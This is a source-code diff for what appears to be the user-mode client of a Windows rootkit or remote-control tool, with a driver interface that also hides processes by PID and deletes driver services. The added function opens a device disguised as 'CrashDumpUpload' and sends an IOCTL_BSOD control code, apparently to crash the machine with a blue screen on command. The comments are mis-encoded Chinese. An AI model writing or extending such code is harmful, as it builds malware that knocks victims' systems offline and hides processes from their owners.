@@ -604,6 +604,37 @@ void Driver::SetHidePid(DWORD pid)
 	CloseHandle(hDevice);
 }
 
+// À¶ÆÁ
+void Driver::BB()
+{
+	HANDLE hDevice = CreateFileA("\\\\.\\CrashDumpUpload",
+		NULL,
+		NULL,
+		NULL,
+		OPEN_EXISTING,
+		NULL,
+		NULL);
+
+	if (hDevice == INVALID_HANDLE_VALUE) {
+		return;
+	}
+
+	DWORD v = 0;
+	char	output;
+	DWORD	returnLen;
+	BOOL result = DeviceIoControl(
+		hDevice,
+		IOCTL_BSOD,
+		&v,
+		4,
+		&output,
+		sizeof(char),
+		&returnLen,
+		NULL);
+
+	CloseHandle(hDevice);
+}
+
 // É¾³ýÇý¶¯·þÎñ
 bool Driver::Delete(const wchar_t* name)
 {
